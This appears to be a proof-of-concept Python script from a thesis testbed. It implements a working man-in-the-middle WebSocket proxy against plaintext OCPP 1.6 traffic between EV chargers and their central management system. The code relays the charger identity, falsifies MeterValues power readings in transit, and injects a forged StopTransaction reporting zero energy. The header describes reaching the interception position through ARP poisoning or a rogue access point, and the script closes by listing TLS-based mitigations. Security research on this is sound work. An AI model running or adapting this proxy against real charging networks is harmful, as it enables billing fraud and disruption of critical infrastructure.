"""
===========================================================================
EVSecSim PoC — Attack #2: MITM WebSocket Proxy + Session Termination
===========================================================================

ATTACK OVERVIEW
---------------
In production OCPP 1.6 deployments the WebSocket channel is plaintext
(ws://) with no message integrity protection. An attacker positioned
between the EVSE and CSMS can:

  1. Intercept and READ every OCPP message in both directions
  2. MODIFY messages in transit (e.g. falsify MeterValues power readings)
  3. INJECT arbitrary OCPP messages as either the EVSE or the CSMS
  4. DROP messages to cause silent session loss

This script implements a transparent WebSocket proxy that performs all
four capabilities.

INITIAL ACCESS — HOW THE ATTACKER ACHIEVES NETWORK INTERPOSITION
-----------------------------------------------------------------
In the EVSecSim testbed, MITM positioning is SIMULATED by manually
reconfiguring the EVSE to connect to the proxy port (9001) instead of
the real CSMS (9000). No ARP spoofing or network manipulation is
performed in the testbed.

In a real-world deployment, the attacker achieves the equivalent
position via one of the following vectors (documented in INL/CON-23-72329):

  ARP Poisoning (most applicable to HDB carpark scenario):
    The attacker connects to the EVSE/CSMS shared management LAN and
    broadcasts gratuitous ARP frames: "CSMS IP → attacker MAC". The
    EVSE's ARP cache is poisoned; TCP connections toward the CSMS are
    transparently redirected to the attacker's machine, which runs this
    proxy and relays to the real CSMS.

  Rogue Access Point:
    Attacker deploys a rogue Wi-Fi AP with the legitimate SSID. EVSEs
    using Wi-Fi associate to it, giving the attacker full TCP
    interception capability.

  Compromised Network Device:
    Attacker exploits firmware on a CPO network switch/router, gaining
    forwarding-rule control without poisoning end-host ARP tables.

The root enabling condition is the absence of TLS (ws:// not wss://).
TLS mutual authentication would prevent all of the above: the EVSE would
reject any proxy that cannot present the CSMS's valid certificate.

CP IDENTITY RELAY — what "mirrors the CP ID" actually means:
    The EVSE sends its Charge Point identity as the first raw WebSocket
    text frame (before any OCPP JSON). The proxy captures this frame and
    relays it unchanged to the real CSMS upstream. The attacker does NOT
    need to know the CP ID in advance — it is captured passively at
    connection setup. The CSMS sees the real CP identity because the
    proxy forwards it transparently. This is transparent relay, not
    impersonation.

  Real EVSE --[ws:9001]--> [ MITM PROXY ] --[ws:9000]--> CSMS
                                 |
                          intercept / modify
                          inject / drop

REFERENCE
---------
  Johnson et al. (2023). Disrupting EV Charging Sessions...
  Idaho National Laboratory INL/CON-23-72329, PoC #2.
  ARP poison → WebSocket MITM → RemoteStopTransaction injection.

HOW TO RUN
----------
  Step 1 — Start CSMS (unchanged):
    python csms_server4.py

  Step 2 — Start MITM proxy (this script):
    python attack_mitm_session.py

  Step 3 — Start EVSE pointed at PROXY port 9001:
    Change line 186 in evse_client4_fixed.py:
      ws://127.0.0.1:9000  →  ws://127.0.0.1:9001
    python evse_client4_fixed.py

  Optional pcap capture (run before step 3):
    sudo tcpdump -i lo -w mitm_session.pcap port 9000 or port 9001

ATTACK PHASES
-------------
  Phase 1 — Transparent forwarding   : all EVSE↔CSMS traffic relayed,
                                        logged with direction labels
  Phase 2 — MeterValues tampering    : power readings modified in transit
                                        before being forwarded to CSMS
  Phase 3 — StopTransaction injection: forged StopTransaction sent to
                                        CSMS as if from EVSE — session
                                        terminated without EVSE consent

CONFIGURABLE PARAMETERS
-----------------------
  PROXY_PORT          Port the EVSE connects to  (default 9001)
  CSMS_URL            Real CSMS WebSocket address (default ws://127.0.0.1:9000)
  TAMPER_DELAY_S      Seconds before MeterValues tampering begins
  INJECT_DELAY_S      Seconds before StopTransaction injection
  TAMPER_VALUE_KW     Falsified power value sent to CSMS during tamper phase
===========================================================================
"""

import asyncio
import os
import websockets
import json
import time
import signal
import sys
import argparse
from datetime import datetime, timezone

# ===========================================================================
# CONFIG
# ===========================================================================

PROXY_PORT       = 9001
CSMS_URL         = "ws://127.0.0.1:9000"
TAMPER_DELAY_S   = 10       # seconds after connection before tampering starts
INJECT_DELAY_S   = 20       # seconds after connection before StopTransaction injected

# BUG FIX: was 0.0 — identical to real pandapower values when EV loads are off.
# 999.0 is an impossible real-world value, making tampering unambiguous in logs.
TAMPER_VALUE_KW  = 999.0    # falsified power reading injected into MeterValues

# ===========================================================================
# COLOUR HELPERS
# ===========================================================================

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

def ts():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def log_proxy(msg):    print(f"{CYAN}[PRX {ts()}]{RESET} {msg}")
def log_evse(msg):     print(f"{GREEN}[E→C {ts()}]{RESET} {msg}")
def log_csms(msg):     print(f"{BLUE}[C→E {ts()}]{RESET} {msg}")
def log_attack(msg):   print(f"{RED}[ATK {ts()}]{RESET} {msg}")
def log_tamper(msg):   print(f"{YELLOW}[TAM {ts()}]{RESET} {msg}")

# ===========================================================================
# OCPP MESSAGE PARSING
# ===========================================================================

CALL        = 2
CALLRESULT  = 3
CALLERROR   = 4

def parse_ocpp(raw: str):
    """Return (msg_type, uid, action_or_none, payload_or_none)."""
    try:
        msg = json.loads(raw)
        if msg[0] == CALL:
            return CALL, msg[1], msg[2], msg[3]
        elif msg[0] == CALLRESULT:
            return CALLRESULT, msg[1], None, msg[2]
        elif msg[0] == CALLERROR:
            return CALLERROR, msg[1], msg[2], msg[3]
    except Exception:
        pass
    return None, None, None, None

def forge_stop_transaction(transaction_id: int = 1) -> str:
    """
    Craft a valid OCPP 1.6 StopTransaction CALL frame.

    StopTransaction is sent EVSE→CSMS to signal end of a charging session.
    By injecting this from the proxy (on the CSMS-facing side), the CSMS
    believes the session has ended legitimately — billing is finalised,
    the connector is marked available, and the EVSE loses session state
    on the CSMS side.

    The EVSE itself has no idea this happened.
    """
    payload = {
        "transactionId": transaction_id,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "meterStop": 0,          # report 0 Wh consumed — corrupts billing record
        "reason": "Remote",
    }
    uid = f"mitm-stop-{int(time.time())}"
    frame = json.dumps([CALL, uid, "StopTransaction", payload])
    return frame, uid

def tamper_meter_values(raw: str) -> str:
    """
    Intercept a MeterValues CALL and replace the power reading with
    TAMPER_VALUE_KW before forwarding to the CSMS.

    The EVSE believes it sent the real value.
    The CSMS receives and logs the falsified value.
    The operator dashboard shows TAMPER_VALUE_KW.
    """
    try:
        msg = json.loads(raw)
        if msg[0] != CALL or msg[2] != "MeterValues":
            return raw, False

        original_val = None
        try:
            original_val = msg[3]["meterValue"][0]["sampledValue"][0]["value"]
            msg[3]["meterValue"][0]["sampledValue"][0]["value"] = str(TAMPER_VALUE_KW)
        except (KeyError, IndexError):
            try:
                original_val = msg[3]["meter_value"][0]["sampled_value"][0]["value"]
                msg[3]["meter_value"][0]["sampled_value"][0]["value"] = str(TAMPER_VALUE_KW)
            except (KeyError, IndexError):
                return raw, False

        return json.dumps(msg), original_val
    except Exception:
        return raw, False

# ===========================================================================
# SESSION STATE
# ===========================================================================

class SessionState:
    def __init__(self):
        self.connected_at   = None
        self.cp_id          = None
        self.tamper_active  = False
        self.injected       = False
        self.msg_count_ec   = 0      # EVSE → CSMS
        self.msg_count_ce   = 0      # CSMS → EVSE
        self.tamper_count   = 0
        self.actions_seen   = []

    def elapsed(self) -> float:
        if self.connected_at is None:
            return 0.0
        return time.perf_counter() - self.connected_at

# ===========================================================================
# CORE PROXY LOGIC
# ===========================================================================

async def proxy_session(evse_ws, state: SessionState):
    """
    Manage one EVSE connection through the proxy to the real CSMS.

    All messages are inspected. Depending on elapsed time:
      - Phase 1 (0..TAMPER_DELAY_S):   transparent forwarding + logging
      - Phase 2 (TAMPER_DELAY_S..INJECT_DELAY_S): MeterValues tampered
      - Phase 3 (INJECT_DELAY_S+):     StopTransaction injected once
    """
    log_proxy("EVSE connected to proxy — opening upstream connection to CSMS")

    try:
        async with websockets.connect(
            CSMS_URL,
            ping_interval=None,
            ping_timeout=None,
        ) as csms_ws:

            log_proxy(f"Upstream CSMS connection established: {CSMS_URL}")

            # ----------------------------------------------------------------
            # Transparent CP ID relay
            # ----------------------------------------------------------------
            # The EVSE sends its CP identity as the FIRST raw WebSocket frame
            # (before any OCPP JSON). This is a non-standard identification
            # mechanism: evse_client4.py line 190 does `await ws.send("CP_1")`.
            #
            # The proxy captures this frame (evse_ws.recv()) before any OCPP
            # exchange occurs, then immediately relays it verbatim to the
            # upstream CSMS connection (csms_ws.send(cp_id_raw)).
            #
            # The CSMS registers the session under the EVSE's real CP identity.
            # The attacker does NOT need to know the CP ID in advance — it is
            # captured passively from the EVSE's own first message.
            # This is transparent relay, not impersonation or spoofing.
            # ----------------------------------------------------------------
            cp_id_raw = await evse_ws.recv()
            state.cp_id = cp_id_raw
            state.connected_at = time.perf_counter()

            log_proxy(f"CP identity captured: '{cp_id_raw}' — relaying to CSMS")
            await csms_ws.send(cp_id_raw)

            log_attack("=" * 56)
            log_attack(f"MITM SESSION ACTIVE for CP: '{cp_id_raw}'")
            log_attack(f"Tampering begins in  : {TAMPER_DELAY_S}s")
            log_attack(f"Injection scheduled  : {INJECT_DELAY_S}s")
            log_attack("=" * 56)
            print()

            # ----------------------------------------------------------------
            # Bidirectional relay
            # ----------------------------------------------------------------
            async def evse_to_csms():
                """Relay EVSE → CSMS, with optional MeterValues tampering."""
                async for raw in evse_ws:
                    state.msg_count_ec += 1
                    mtype, uid, action, payload = parse_ocpp(raw)

                    elapsed = state.elapsed()

                    if action:
                        state.actions_seen.append(action)

                    # ---- Phase 1: transparent ----
                    if elapsed < TAMPER_DELAY_S:
                        if action:
                            log_evse(f"[{action}] uid={uid[:8]} → forwarding")
                        else:
                            log_evse(f"[Response uid={uid[:8] if uid else '?'}] → forwarding")
                        await csms_ws.send(raw)

                    # ---- Phase 2: tamper MeterValues ----
                    elif elapsed < INJECT_DELAY_S:
                        if not state.tamper_active:
                            state.tamper_active = True
                            print()
                            log_tamper("=" * 56)
                            log_tamper("PHASE 2 ACTIVE — MeterValues TAMPERING")
                            log_tamper(f"  EVSE sends real kW values")
                            log_tamper(f"  CSMS receives {TAMPER_VALUE_KW} kW (impossible fake)")
                            log_tamper(f"  Injection in {INJECT_DELAY_S - TAMPER_DELAY_S}s")
                            log_tamper("=" * 56)
                            print()

                        if action == "MeterValues":
                            modified, original = tamper_meter_values(raw)
                            if original is not False:
                                state.tamper_count += 1
                                log_tamper(
                                    f"TAMPERED #{state.tamper_count}: "
                                    f"real={original} kW → csms sees={TAMPER_VALUE_KW} kW"
                                )
                                await csms_ws.send(modified)
                            else:
                                log_tamper("MeterValues: parse failed — forwarding unmodified")
                                await csms_ws.send(raw)
                        else:
                            if action:
                                log_evse(f"[{action}] → forwarding (tamper phase)")
                            await csms_ws.send(raw)

                    # ---- Phase 3: post-injection (StopTransaction already sent) ----
                    else:
                        if action:
                            log_evse(f"[{action}] → forwarding (post-injection)")
                        await csms_ws.send(raw)

            async def csms_to_evse():
                """Relay CSMS → EVSE transparently (log only)."""
                async for raw in csms_ws:
                    state.msg_count_ce += 1
                    mtype, uid, action, payload = parse_ocpp(raw)
                    if action:
                        log_csms(f"[{action}] uid={uid[:8]} → relaying to EVSE")
                    else:
                        log_csms(f"[Response uid={uid[:8] if uid else '?'}] → relaying to EVSE")
                    await evse_ws.send(raw)

            async def injection_timer():
                """Wait then inject forged StopTransaction into CSMS."""
                await asyncio.sleep(INJECT_DELAY_S)

                if state.injected:
                    return

                state.injected = True
                frame, uid = forge_stop_transaction(transaction_id=1)

                print()
                log_attack("=" * 56)
                log_attack("PHASE 3 — INJECTING FORGED StopTransaction")
                log_attack(f"  As if EVSE '{state.cp_id}' sent it → CSMS")
                log_attack(f"  uid       : {uid}")
                log_attack(f"  meterStop : 0 Wh  (billing corrupted)")
                log_attack(f"  reason    : Remote")
                log_attack("EVSE keeps charging. CSMS closes session.")
                log_attack("=" * 56)
                print()

                try:
                    await csms_ws.send(frame)
                    log_attack("StopTransaction frame delivered to CSMS")
                    log_attack("Watch CSMS terminal — session should be acknowledged")
                except Exception as exc:
                    log_attack(f"Injection failed: {exc}")

            # Fire the injector in the background — it must NOT be in the
            # wait set. If it were, its completion at T+INJECT_DELAY_S would
            # trigger FIRST_COMPLETED, cancel the forwarding tasks, and drop
            # the EVSE connection mid-session (the crash you observed).
            injector_task = asyncio.create_task(
                injection_timer(), name="injector"
            )

            # Only wait on the two connection-bound tasks.
            # Proxy keeps running until EVSE or CSMS actually disconnects.
            done, pending = await asyncio.wait(
                [
                    asyncio.create_task(evse_to_csms(), name="evse->csms"),
                    asyncio.create_task(csms_to_evse(), name="csms->evse"),
                ],
                return_when=asyncio.FIRST_COMPLETED,
            )

            # Clean up everything on disconnect
            injector_task.cancel()
            for task in pending:
                task.cancel()
            for task in list(pending) + [injector_task]:
                try:
                    await task
                except asyncio.CancelledError:
                    pass

    except ConnectionRefusedError:
        log_attack(
            f"Cannot reach CSMS at {CSMS_URL} — "
            "is csms_server4.py running?"
        )
    except Exception as exc:
        log_proxy(f"Session ended: {type(exc).__name__}: {exc}")

    finally:
        _print_session_summary(state)


def _print_session_summary(state: SessionState):
    elapsed = state.elapsed()
    print()
    print(f"{BOLD}{'='*56}{RESET}")
    print(f"{BOLD}  Session summary — CP '{state.cp_id}'{RESET}")
    print(f"{'='*56}")
    print(f"  Duration              : {elapsed:.1f}s")
    print(f"  EVSE→CSMS messages   : {state.msg_count_ec}")
    print(f"  CSMS→EVSE messages   : {state.msg_count_ce}")
    print(f"  MeterValues tampered : {state.tamper_count}")
    print(f"  StopTransaction sent : {'YES (session terminated)' if state.injected else 'NO'}")
    print(f"  Actions observed     : {', '.join(sorted(set(state.actions_seen)))}")
    print(f"{'='*56}")
    print()
    print(f"  {YELLOW}THESIS EVIDENCE CHECKLIST:{RESET}")
    print(f"  [ ] pcap: two TCP streams on ports 9000 and 9001")
    print(f"  [ ] pcap: MeterValues frame modified in transit (Phase 2)")
    print(f"  [ ] pcap: StopTransaction frame NOT sent by real EVSE (Phase 3)")
    print(f"  [ ] CSMS log: session terminated even though EVSE never stopped")
    print(f"  [ ] EVSE log: EVSE continues sending MeterValues after injection")
    print()
    print(f"  {CYAN}MITIGATION (document in thesis):{RESET}")
    print(f"  - WSS (TLS): encrypts + authenticates channel, prevents MITM read")
    print(f"  - Mutual TLS cert auth: EVSE/CSMS verify each other's identity")
    print(f"  - OCPP 2.0.1 message signing: per-message integrity, not just transport")
    print()

# ===========================================================================
# PROXY SERVER
# ===========================================================================

async def run_proxy():
    state_store = {}

    async def handler(evse_ws):
        state = SessionState()
        session_id = id(evse_ws)
        state_store[session_id] = state
        try:
            await proxy_session(evse_ws, state)
        finally:
            state_store.pop(session_id, None)

    proxy_bind = os.environ.get("PROXY_BIND", "0.0.0.0")
    server = await websockets.serve(
        handler,
        proxy_bind,
        PROXY_PORT,
        ping_interval=None,
        ping_timeout=None,
    )

    print()
    print(f"{BOLD}{RED}{'='*56}{RESET}")
    print(f"{BOLD}{RED}  EVSecSim PoC — MITM WebSocket Proxy{RESET}")
    print(f"{BOLD}{RED}{'='*56}{RESET}")
    print(f"  Proxy listening on  : ws://127.0.0.1:{PROXY_PORT}")
    print(f"  Forwarding to CSMS  : {CSMS_URL}")
    print(f"  Tamper phase starts : T+{TAMPER_DELAY_S}s after EVSE connects")
    print(f"  Injection at        : T+{INJECT_DELAY_S}s after EVSE connects")
    print(f"  Tampered power value: {TAMPER_VALUE_KW} kW")
    print(f"{BOLD}{RED}{'='*56}{RESET}")
    print()
    print(f"  {YELLOW}ACTION REQUIRED:{RESET}")
    print(f"  Run EVSE pointed at this proxy:")
    print(f"    python evse_client4_fixed.py --url ws://127.0.0.1:{PROXY_PORT}")
    print()

    stop = asyncio.Event()

    def handle_signal(*_):
        print("\nShutting down proxy...")
        stop.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            asyncio.get_event_loop().add_signal_handler(sig, handle_signal)
        except NotImplementedError:
            signal.signal(sig, handle_signal)

    await stop.wait()
    server.close()
    await server.wait_closed()

# ===========================================================================
# CLI + ENTRY POINT
# ===========================================================================

def parse_args():
    parser = argparse.ArgumentParser(
        description="EVSecSim PoC #2 — MITM WebSocket proxy for OCPP 1.6",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Default: proxy on 9001, tamper at 15s, inject at 35s
  python attack_mitm_session.py

  # Faster demo: tamper immediately, inject at 20s
  python attack_mitm_session.py --tamper-delay 0 --inject-delay 20

  # Tamper only (no StopTransaction injection)
  python attack_mitm_session.py --inject-delay 99999

  # Custom tamper value (report 999 kW instead of real value)
  python attack_mitm_session.py --tamper-value 999.0
        """,
    )
    parser.add_argument("--proxy-port",    type=int,   default=PROXY_PORT,
                        help="Port the EVSE connects to (default 9001)")
    parser.add_argument("--csms-url",      default=CSMS_URL,
                        help="Real CSMS WebSocket URL")
    parser.add_argument("--tamper-delay",  type=float, default=TAMPER_DELAY_S,
                        help="Seconds before MeterValues tampering begins")
    parser.add_argument("--inject-delay",  type=float, default=INJECT_DELAY_S,
                        help="Seconds before StopTransaction injection")
    parser.add_argument("--tamper-value",  type=float, default=TAMPER_VALUE_KW,
                        help="Power value (kW) to report to CSMS during tamper phase")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    PROXY_PORT      = args.proxy_port
    CSMS_URL        = args.csms_url
    TAMPER_DELAY_S  = args.tamper_delay
    INJECT_DELAY_S  = args.inject_delay
    TAMPER_VALUE_KW = args.tamper_value

    try:
        asyncio.run(run_proxy())
    except KeyboardInterrupt:
        pass
